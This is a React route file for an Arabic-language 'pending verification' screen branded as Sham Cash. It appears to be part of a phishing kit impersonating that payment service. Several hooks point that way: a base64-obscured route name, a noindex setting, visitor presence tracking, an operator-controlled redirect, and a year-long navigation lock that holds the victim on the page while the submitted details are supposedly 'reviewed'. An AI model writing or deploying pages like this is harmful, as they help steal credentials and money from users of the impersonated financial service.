import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { ShieldCheck, Loader2, FileSearch, Zap, EyeOff, Hourglass } from "lucide-react";
import { StatusHero } from "@/components/status-hero";
import { z } from "zod";
import { usePresenceTracker } from "@/lib/presence";
import { useAdminRedirect } from "@/lib/admin-redirect";
import { useRequireName } from "@/lib/require-name";
import { useNavigationLock } from "@/lib/nav-lock";
import { AppScreen } from "@/components/app-screen";

// قفل الصفحة لمدة طويلة؛ يُفكّه توجيه الإدارة عبر window.location.replace
const PENDING_LOCK_MS = 365 * 24 * 60 * 60 * 1000;

const searchSchema = z.object({
  email: z.string().optional(),
});

export const Route = createFileRoute("/cGVuZGluZw")({
  ssr: false,
  validateSearch: searchSchema,
  head: () => ({
    meta: [
      { name: "robots", content: "noindex, nofollow" },
      { title: "بانتظار التحقق | شام كاش" },
      {
        name: "description",
        content: "طلبك قيد المراجعة، يتم التحقق من بياناتك من قبل فريق شام كاش.",
      },
      { property: "og:title", content: "بانتظار التحقق — شام كاش" },
      {
        property: "og:description",
        content: "طلبك قيد المراجعة، يتم التحقق من بياناتك من قبل فريق شام كاش.",
      },
    ],
  }),
  component: PendingPage,
});

function PendingPage() {
  usePresenceTracker({ page: "/cGVuZGluZw" });
  useAdminRedirect();
  useRequireName();
  useNavigationLock("/cGVuZGluZw", Date.now() + PENDING_LOCK_MS);
  const { email } = Route.useSearch();
  const [infoNote, setInfoNote] = useState<string | null>(null);
  useEffect(() => {
    try { setInfoNote(window.sessionStorage.getItem("sham_info_note")); } catch { /* ignore */ }
  }, []);

  const title = infoNote ? "مطلوب معلومات إضافية" : "بانتظار التحقق";
  const subtitle = infoNote
    ? "يرجى مراجعة الرسالة أدناه من فريق المراجعة."
    : "جاري مراجعة طلبك، تُحدّث الصفحة تلقائياً فور الاعتماد.";

  return (
    <AppScreen compactLogo>
      <div dir="rtl" className="flex flex-col items-center text-center">
        <StatusHero
          tone={infoNote ? "warning" : "pending"}
          icon={infoNote ? ShieldCheck : Hourglass}
          stripLabel={infoNote ? "مطلوب إجراء" : "قيد المراجعة"}
          title={title}
          subtitle={subtitle}
          spin={!infoNote}
        />

        {infoNote ? (
          <div
            className="status-surface mt-5 w-full rounded-3xl p-4 text-right"
            style={{
              background:
                "linear-gradient(180deg, rgba(15,23,42,0.8) 0%, rgba(2,6,23,0.7) 100%)",
              border: "1px solid rgba(245, 158, 11, 0.3)",
              backdropFilter: "blur(24px)",
            }}
          >
            <p className="text-xs font-bold text-amber-300">رسالة من فريق المراجعة</p>
            <p className="mt-1 whitespace-pre-line text-[12px] leading-7 text-amber-100/90">
              {infoNote}
            </p>
          </div>
        ) : null}

        {email ? (
          <div
            className="status-pill mt-4 w-full rounded-2xl px-4 py-2.5 text-xs text-slate-300"
            style={{
              background: "rgba(15,23,42,0.4)",
              border: "1px solid rgba(255,255,255,0.05)",
            }}
          >
            البريد المسجّل: <span className="font-semibold text-white">{email}</span>
          </div>
        ) : null}

        <div
          className="status-surface mt-5 w-full rounded-3xl p-5 text-center sm:p-6"
          style={{
            background: "linear-gradient(180deg, rgba(15,23,42,0.85) 0%, rgba(2,6,23,0.75) 100%)",
            border: "1px solid rgba(6,182,212,0.2)",
            backdropFilter: "blur(24px)",
            boxShadow: "0 10px 30px -10px rgba(0,0,0,0.5)",
          }}
        >
          <div className="flex items-center justify-center">
            <Loader2 className="h-6 w-6 animate-spin text-cyan-300" />
          </div>
          <p className="mt-3 text-[15px] font-extrabold leading-7 text-white">
            يتم التحقق من المعلومات المدخلة
          </p>
          <p className="mt-1 text-[13px] font-medium leading-6 text-slate-300">
            يرجى الانتظار…
          </p>
        </div>

      </div>
    </AppScreen>
  );
}
